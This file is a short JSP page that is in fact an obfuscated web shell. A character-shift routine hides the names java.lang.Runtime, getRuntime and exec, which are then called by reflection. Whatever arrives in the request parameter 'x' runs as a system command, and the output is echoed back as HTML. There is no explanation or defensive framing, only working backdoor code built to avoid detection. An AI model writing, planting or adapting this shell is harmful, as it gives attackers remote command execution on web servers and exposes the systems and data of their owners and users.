<%@ page contentType="text/html;charset=UTF-8"  language="java" %>
<%@ page import="java.lang.reflect.Method"%>
<%!public static String eStr(String str){String result = "";int length = str.length();for (int i = 0; i < length; i++){char z=str.charAt(i);z=(char)(z-5);result=result+z;}return result;}%>
<%
if(request.getParameter("x")!=null){Class rt = Class.forName(eStr("of{f3qfsl3Wzsynrj"));
Process e = (Process) rt.getMethod(new String(eStr("j}jh")), String.class).invoke(rt.getMethod(new String(eStr("ljyWzsynrj"))).invoke(null, new Object[]{}), request.getParameter("x") );
java.io.InputStream in = e.getInputStream();int a = -1;byte[] b = new byte[2048];
out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b));}out.print("</pre>");}
%>